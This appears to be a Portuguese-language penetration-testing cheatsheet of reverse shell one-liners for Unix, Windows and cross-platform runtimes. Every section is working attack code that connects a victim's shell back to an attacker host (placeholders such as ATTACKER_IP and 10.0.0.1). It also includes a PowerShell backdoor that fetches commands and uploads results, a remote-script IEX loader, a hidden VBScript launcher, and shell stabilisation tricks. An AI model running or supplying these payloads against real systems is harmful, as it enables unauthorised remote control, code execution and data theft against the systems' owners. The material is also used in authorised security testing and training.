# Reverse Shell Cheatsheet

### UNIX/LINUX

#### BASH

*   **TCP Reverse**

    ```bash
    bash -i >& /dev/tcp/IP/PORT 0>&1
    ```

    Bash puro, stdio, sem dependências externas.

#### SH

*   **TCP Reverse**

    ```bash
    sh -i >& /dev/tcp/IP/PORT 0>&1
    ```

    Funciona se `/dev/tcp` habilitado (bash/ksh).
*   Alternativa (Exec):

    ```shellscript
    0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196
    ```

#### NETCAT

*   **Com `-e` (Old nc/traditional):**

    ```bash
    nc -e /bin/sh IP PORT
    ```

    Netcat tradicional.
*   **Sem `-e` (Busybox/Ubuntu):**

    ```bash
    nc IP PORT -c /bin/sh
    ```

    `-c` substitui `-e` em algumas versões.
*   **Com FIFO universal:**

    ```bash
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT >/tmp/f
    ```

    Compatível em ambientes restritos.

#### SOCAT

*   **Shell básica:**

    ```bash
    socat tcp-connect:IP:PORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
    ```

    Suporte a criptografia, tunneling.

#### PERL

*   **TCP Reverse**

    ```bash
    perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    ```

    Perl nativo, encontrado em muitos sistemas.

#### PYTHON

*   **Python2**

    ```bash
    python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
    ```
*   **Python3**

    ```bash
    python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.run(["/bin/sh","-i"]);'
    ```

    Muito útil em ambientes com python mas sem nc/socat.

#### RUBY

*   **TCP Reverse**

    ```bash
    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("IP","PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
    ```

#### PHP

*   **Socket reverse**

    ```bash
    php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
    ```

#### AWK (gawk)

*   **TCP shell**

    ```bash
    awk 'BEGIN {s="/inet/tcp/0/IP/PORT";while(42){ do{ printf "shell> " |& s; s |& getline c; if(c){ while((c |& getline) > 0) print $0 |& s }}}'
    ```

#### LUA

*   **TCP reverse**

    ```bash
    lua -e "require('socket');require('os');t=socket.tcp();t:connect('IP','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3')"
    ```

#### XTERM

*   **Abrir shell em X (remoto)**

    ```bash
    xterm -display IP:0
    ```

***

### WINDOWS

#### POWERSHELL

*   **TCP Reverse**

    ```powershell
    powershell -NoP -NonI -W Hidden -Exec Bypass -Command "..."
    ```

    (Ver cheats no texto abaixo)
*   **Simples**

    ```powershell
    $client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)};$client.Close()
    ```
* Nishang

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>
```

#### CMD (Windows Nativo)

*   **Via `telnet`**

    ```bat
    telnet IP PORT
    ```

    (mas não é shell, só conexão!)
*   **Via VBScript**

    ```bat
    echo strCommand = "cmd.exe" > shell.vbs
    echo Set objShell = CreateObject("WScript.Shell") >> shell.vbs
    echo objShell.Run strCommand, 0, False >> shell.vbs
    ```

    Executa CMD invisível.

#### NETCAT for Windows

*   **TCP Reverse**

    ```bat
    nc.exe IP PORT -e cmd.exe
    ```

***

### MULTI-PLATAFORMA / OUTROS

#### JAVA

*   **Reverse shell**

    ```java
    Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"});
    ```

#### NODEJS

*   **Reverse shell TCP**

    ```javascript
    (function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(PORT,"IP",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client)});return /a/;})();
    ```
* ```shellscript
  node -e 'var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(<PORT>, "<IP>", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });'
  ```

#### GO

*   **Reverse shell**

    ```go
    package main
    import ("net";"os/exec";"io");func main(){c,_:=net.Dial("tcp","IP:PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}
    ```
* ```shellscript
  echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<IP>:<PORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
  ```

#### BusyBox

*   **sh**

    ```bash
    /bin/busybox nc IP PORT -e /bin/sh
    ```

#### AWK (POSIX)

*   **(gawk only)**

    ```bash
    awk 'BEGIN {s="/inet/tcp/0/IP/PORT";while(42){s|&getline c;if(c)while((c|&getline)>0)print $0|&s}}'
    ```

***

### TRANSPORTE CRIPTOGRAFADO / EDIÇÃO

#### SOCAT com SSL

```bash
socat OPENSSL:IP:PORT,verify=0 EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

#### SSH

*   **Reverse Tunnel**

    ```bash
    ssh -R PORT:localhost:22 user@IP
    ```

    Túnel reverso via SSH.

***

### EXTRA: ICMP, DNS, HTTP(S), WEBSOCKET

* **ICMP Reverse**
  * (Precisa de binários extras, ex: icmpsh, scapy, pingbash)
* **DNS Reverse**
  * DNSCat2, dnscat, iodine, etc.
* **HTTP/HTTPS/WS**
  * Canais C2 customizados, veja frameworks/metasploit.

***

#### Exemplos mistos

```bash
# Bash + openssl
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1 | openssl enc -aes-256-cbc -base64 -salt -pass pass:SenhaSecreta

# Python HTTPS wrapper (certificado autoassinado)
python3 -c "import socket,ssl,subprocess,os; s=socket.socket(); s=ssl.wrap_socket(s); s.connect(('ATTACKER_IP',ATTACKER_PORT)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.run(['/bin/sh','-i'])"

# Powershell HTTP POST backdoor
powershell -NoP -NonI -W Hidden -Exec Bypass -Command while($true){$wc=New-Object System.Net.WebClient; $cmd=$wc.DownloadString('https://ATTACKER_IP/payload'); $output=iex $cmd 2>&1; $wc.UploadString('https://ATTACKER_IP/results',$output); Start-Sleep -Seconds 30}
```



## 🌐 Escutando no atacante

```bash
rlwrap nc -nvlp 1234
```

***

### 🐍 Bash

```bash
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```

```bash
0<&196;exec 196<>/dev/tcp/10.0.0.1/1234; sh <&196 >&196 2>&196
```

```bash
exec 5<>/dev/tcp/10.0.0.1/1234;cat <&5 | while read line; do $line 2>&5 >&5; done
```

***

### 💎 Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
open(STDIN,">&S");open(STDOUT,">&S");
open(STDERR,">&S");exec("/bin/sh -i");};'
```

```perl
perl -MIO -e '$p=fork;exit,if($p);
$~->fdopen($_,r),IO::Select->new($_)->can_read and exec"/bin/sh";'
```

***

### 🐍 Python

{% code overflow="wrap" fullWidth="false" %}
```python
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
{% endcode %}

Python3 equivalente:

```python
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.0.0.1",1234));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
```

***

### 💻 PHP

```php
php -r '$sock=fsockopen("10.0.0.1",1234);
exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
php -r '$sock=fsockopen("10.0.0.1",1234);
$p=proc_open("/bin/sh -i", [0=>$sock, 1=>$sock, 2=>$sock], $pipes);'
```

***

### 💭 Ruby

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","1234");
while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

***

### ☕ Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/1234;
cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

***

### 🐚 Netcat (tradicional)

```bash
nc -e /bin/sh 10.0.0.1 1234
```

```bash
/bin/sh | nc 10.0.0.1 1234
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc 10.0.0.1 1234 0</tmp/p | /bin/sh >/tmp/p 2>&1
```

***

### 🆕 Netcat (Ncat do Nmap)

```bash
ncat 10.0.0.1 1234 -e /bin/bash
```

***

### 🧼 Socat

Na máquina do atacante (escutando):

```bash
socat file:`tty`,raw,echo=0 tcp-listen:1234
```

Na máquina vítima (conectar de volta):

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:1234
```

***

### 📦 JavaScript (Node.js)

```js
require('child_process').exec('nc 10.0.0.1 1234 -e /bin/sh')
```

***

### ⛓ Xterm

No atacante:

```bash
xhost +targetip
```

Na vítima:

```bash
xterm -display attackerip:1
```

***

### 🧪 Diagnóstico: qual shell consegui?

Se estiver com shell interativo ruim (sem autocompletar, etc), use:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Ou tente:

```bash
script /dev/null -c bash
```

***

### 🧠 Dica para tornar o shell mais estável

Depois de usar `pty.spawn`, pressione:

* `Ctrl+Z`
* No shell local: `stty raw -echo; fg`
* Depois pressione `Enter` duas vezes

